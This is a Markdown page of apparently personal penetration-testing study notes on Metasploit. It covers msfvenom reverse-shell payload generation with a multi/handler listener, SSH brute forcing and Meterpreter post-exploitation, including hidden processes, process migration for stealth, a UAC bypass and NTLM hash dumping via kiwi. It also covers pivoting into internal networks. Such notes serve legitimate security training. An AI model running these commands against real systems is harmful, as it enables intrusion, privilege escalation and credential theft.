---
layout: blank
pagetitle: Metasploit
---


### The Basics
**Setup and Navigate Metasploit**
- Database isn't enabled by default
	- `sudo msfdb init`, `sudo systemctl enable postgresql`
		- To restart database, stop postgresql and then `sudo msfdb reinit`
	- Run `db_status` in the console to check
- Workspaces
	- `workspace` - create workspaces when pentesting a client 
	- `db_nmap` - works like regular nmap, but stores results in the db
		- Query db with `hosts` for hosts and `services` for services
- `show -h` to show all modules, like `exploits`, `payloads`, and `auxiliary`
	- Showing payloads is nice; default is usually reverse tcp shel

**Auxiliary Modules**
- Used for external attacks, like enumeration, scanning, fuzzing, sniffing, etc.
- `search` to search through the modules, with `type` to specify the module type
	- For example: `search type:auxiliary smb` or `search Apache 2.4.41`
	- When some exploits have multiple targets, and you have a m
- `use` to use a module with a given index from a search
	- For example: `use /auxiliary/scanner/ssh/ssh_login` to brute force ssh
- `info` to get information about the current module
- `show options` to give options that the module can use
- `set {option} {parameter}` to set an option to a given parameter, like RHOSTS to an IP
	- `unset` to unset
	- can set files by providing the path
	- can set payloads by providing the path (`/payload/linux/x86/shell_reverse_tcp`)
- `vulns` to see if any vulnerabilities have been automatically detected
- `creds` to show any discovered creds
- `run -j` to run a job in the background and create a session for one client
- `sessions` can switch between shells
	- Use CTRL+Z to exit a shell but keep it in the background
	- `sessions -l` to list available sessions
	- `sessions -i {session_number}` to switch (interact) with a session

**SearchSploit**
- `sudo apt install exploitdb`
- Contains archive of all exploit code from exploitdb
- Can search through exploits with `searchsploit {string}`
- Can copy exploits to home directory with `-m`

### Using Payloads 

**Staged/Non-Stated Payloads**
- Non-staged: payload is sent along with the exploit
	- No use of `/`  means that it's non-staged (e.g. `shell_reverse_tcp`)
- Staged: Exploit the machine for a callback, then give a larger payload
	- `/` indicates a staged payload (e.g. `shell/reverse_tcp`)
- `show payloads` to see a list of all payloads
	- `set payload {index}` to set a payload after showing them

**Meterpreter**
- Multi-function payload residing entirely in memory
- `help` to display commands in shell
- `sysinfo`  and `getuid` to gather system data
- put `l` before any command to run it on kali
- Channels:
	- Basically the same thing as `sessions` in msf
	- `shell` and Ctrl+Z to push a channel to the background
	- `channel -l` to list all channels
	- `channel -i 1` to interact with a channel
- `download {file_path}` to download a file from the system
- `upload {local_file_path} {resulting_file_path}` to upload a file to the system
- `search -f {filename}` to search from `/` for a file named `{filename}`

**Executable Payloads**
- `msfvenom` can generate malicious executables
- `msfvenom -l payloads --platform {os (windows)} --arch {arch (x86)}` to list payloads
- `msfvenom -p {path_to_payload} LHOST={IP} LPORT={kali_listening_port} -f {filetype (exe)} -o {output_executable}` to generate an executable
- To get an interactive shell via a staged payload, we can use Metasploit's *multi/handler*
	- `use multi/handler`
	- Staged payloads will now give us an interactive shell
- Steps:
	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f c`
		- We only get one meterpreter shell, so consider these instead:
			- `windows/x64/shell_reverse_tcp`
			- `linux/x64/shell_reverse_tcp`
	- `msfconsole`
	- `use exploit/multi/handler`
	- `set payload linux/x86/meterpreter/reverse_tcp`
	- `set LHOST 10.0.0.1`
	- `set LPORT 4444`
	- `exploit -j`

### Post-Exploitation

**Meterpreter Post-Exploitation Features**

- `idletime` to see how long it's been since the system was used (e.g. don't run shit until empty)
- `getsystem` to attempt to elevate privileges to NT AUTHORITY\\SYSTEM
- `migrate {process_id}` - injects meterpreter into another process for stealth and persistence
	- If no good processes exist, create one with `execute -H -f {process (notepad)}`
		- `-H` hides the process, so no visual representation will be present

**Post-Exploitation Modules**
- After injecting ourselves into another process, our privilege level drops, so we need to escalate
- `exploit/windows/local/bypassuac_sdclt` is good for UAC bypassing on Windows
	- We can set our session to the session running the shell (from Ctrl+Z -> `bg`)
- Can load extensions directly inside the active session using `load`
	- `load kiwi` to load an extension equivalent to Mimikatz
	- `help` to view commands, like `creds_msv` to dump NTLM hashes
- Can search for post exploitation modules with `search post ...`
	- These only require a meterpreter session id

**Pivoting with Metasploit**
- After getting on a machine, we can enumerate the network in a number of ways
- If we find an internal IP from something like `ipconfig`, we can pivot to it with the following:
	- `bg` to background the session in meterpreter and `route add {IP.IP.IP.0/24} {session_number}` to add a route to an internal network reachable through a compromised host
		- We can remove old routes with `route flush`
	- We can then set RHOSTS to an internal IP and use something like `auxiliary/scanner/portscan/tcp` to scan the open ports on the internal IP
	- Running exploits is the exact same--it just required the route set up in Metasploit
- Can also use `autoroute` module to set up pivot routes
	- `use multi/manage/autoroute`
	- `set session {session_ID}` - can list all sessions with `sessions -l`
- Can also combine routes with `server/socks_proxy`
	- `use auxiliary/server/socks_proxy`
	- Then set `VERSION`, `SRVHOST` as localhost, and `run -j`
		- This will probably return the port 1080
	- Then add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf`
	- Can then use proxychains to run commands, such as `xfreerdp`
		- `sudo proxychains xfreerdp /v:{internal_target_IP} /u:luiza`
- Can also use `portfwd`
	- Use a meterpreter session with `sessions -i {session #}`
	- Then, port forward with `portfwd add -l {local_port} -p {remote_port} -r {int_IP}`

### Automation

**Resource Scripts**
- Can chain together metasploit commands and Ruby code
	- Put all commands in a script (.rc) and pass it to msfconsole with `-r`
	- Can configure AutoRunScript to automatically execute a module after the script has been run - `set AutoRunScript {module (/post/windows/manage/migrate)}`
	- `set ExitOnSession` to false to keep the multi/handler listening after a connection
	- Then, run with `-z` and `-j` to put the job in the background and stop us from interacting
- Prebuilt available at `/usr/share/metasploit-framework/scripts/resource`